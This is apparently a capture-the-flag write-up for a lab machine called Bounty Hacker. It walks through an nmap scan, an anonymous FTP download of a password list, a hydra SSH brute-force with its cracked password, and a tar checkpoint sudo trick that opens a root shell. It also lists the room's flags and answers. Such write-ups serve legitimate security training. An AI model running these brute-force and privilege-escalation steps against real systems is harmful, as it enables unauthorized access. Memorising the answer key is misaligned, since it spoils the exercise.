# Bounty Hacker

# Task:

1. Deploy the machine.

'''
No answer needed.
'''

Did a nmap scan and here's the result:

# Nmap 7.95 scan initiated Mon Jul  7 02:45:23 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN nScan -T5 10.10.181.187
Nmap scan report for 10.10.181.187
Host is up (0.23s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.137.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  7 02:45:47 2025 -- 1 IP address (1 host up) scanned in 24.10 seconds


2. Find open ports on the machine.

'''
No answer needed.
'''
Connected via tcp with anonymous (as Anonymous FTP login is allowed)
and did 'mget *.txt'
found 2 file .. one is the task.txt written by lin
and locks.txt with bunch of passwords


3. Who wrote the task list?

'''
Lin
'''

4. What service can you bruteforce whith the test file found?

'''
SSH
'''

Did a hydra bruteforce with the locks.txt as password list and lin as a username 
here's result:

hydra -l lin -P locks.txt ssh://10.10.143.149
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-07 22:54:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.143.149:22/
[22][ssh] host: 10.10.143.149   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-07 22:54:30
                                                                                     
                                                                                     
Found username : lin , Password : Reddr4gonSynd1cat3                                              
                                                                                     

5. What is the users password

'''
RedDr4gonSynd1cat3
'''

After login with ssh and given credential i found user.txt in /home/lin directory

6. user.txt

'''
THM{CR1M3_SyNd1C4T3}
'''

Did sudo -l
and found 
User lin may run the following commands on bountyhacker:
    (root) /bin/tar

Searched GTFObins for this vulnerability and found the cmd 

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

and Boom i have root

Found root.txt in /root/

7. root.txt

'''
THM{80UN7Y_h4cK3r}

'''
